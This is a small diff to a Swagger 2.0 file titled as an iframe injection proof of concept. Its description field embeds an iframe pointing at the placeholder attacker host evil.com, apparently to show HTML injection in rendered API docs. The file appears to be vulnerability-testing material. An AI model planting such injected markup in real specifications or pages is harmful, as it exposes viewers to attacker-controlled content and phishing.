@@ -1,12 +1,12 @@
 swagger: '2.0'
-info:
-  version: production
+info: 
+  version: 1.0.0
   title: iframe injection PoC❗️
   description: |
     <iframe src="https://evil.com" width="600" height="400"></iframe>
 paths:
   /:
-    get:
+    post:
       responses:
         '200':
           description: PoC successful
